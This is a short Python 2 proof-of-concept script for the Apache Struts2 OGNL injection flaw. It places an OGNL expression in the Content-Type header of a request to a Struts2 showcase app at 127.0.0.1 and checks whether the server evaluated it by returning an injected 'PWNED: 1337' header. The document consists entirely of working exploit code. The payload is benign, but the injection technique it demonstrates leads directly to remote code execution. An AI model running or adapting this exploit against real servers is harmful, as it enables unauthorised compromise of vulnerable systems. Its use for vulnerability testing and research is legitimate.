#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import urllib2
import httplib


ognl_payload = ".multipart/form-data~${"
ognl_payload += '#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("PWNED",1330+7)'
ognl_payload += "}"
url = 'http://127.0.0.1:8080/struts2-showcase-2.3.12/showcase.action'
print "\nInjecting Header PWNED: 1337"

headers = {'Content-Type': ognl_payload}
request = urllib2.Request(url, headers=headers)
response = urllib2.urlopen(request)
print "\n\n", response.headers
